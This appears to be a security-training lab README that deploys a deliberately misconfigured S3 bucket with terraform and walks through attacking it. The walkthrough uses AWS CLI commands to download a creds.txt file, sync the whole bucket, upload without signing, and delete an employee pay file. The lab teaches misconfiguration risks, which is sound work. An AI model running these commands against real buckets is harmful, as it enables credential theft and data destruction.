# S3 Misconfiguration

## Note - No aws configuration required for this lab

## please install the below cli tools 


* AWS CLI

```bash
sudo apt-get install awscli
```
* Terraform - click on the below link for further help on on installing 

```bash
https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli
```

* Clone the repository 

```bash
git clone https://github.com/bvabhishek/s3misconfiguration.git
```
* Step 1: Change Directory

```bash
cd /s3misconfiguration
```
* Step : Initialise terraform 

```bash
terraform init
```

* Step : Run `terraform apply -auto-approve`

```bash
terraform apply -auto-approve
```

* Step 4: Export bucket name
```bash
export s3bucket=<bucketname> 
```

* Step 5: Lets try to list down the contents of bucket

```bash
aws s3 ls s3://$s3bucket
```

* Step 6: Now lets perform all the possible attack scenario 

* Step 7: Lets first download the fishy files - change to your current working directory

```bash
aws s3 cp s3://$s3bucket/creds.txt /home/abhi/seasides/

```
* To download all the files from the bucket use sync command

```bash
aws s3 sync s3://$s3bucket /home/abhi/seasides/test/
```

* Step 8: Let's upload a new file 

```bash
aws s3 cp seasides.jpeg s3://$s3bucket --no-sign-request --region us-west-2
```

* Step 9: Let's Delete a file 


```bash
aws s3 rm s3://$s3bucket/emp_pay_dont_delete.csv --no-sign-request --region us-west-2
```


* By this we know that the attacker has performed all the malicious functionalities ie, CRUD operations which leads to Vulnerabilities such as 
 * Broken Authentication
 * Sensitive Information Disclosure 


 
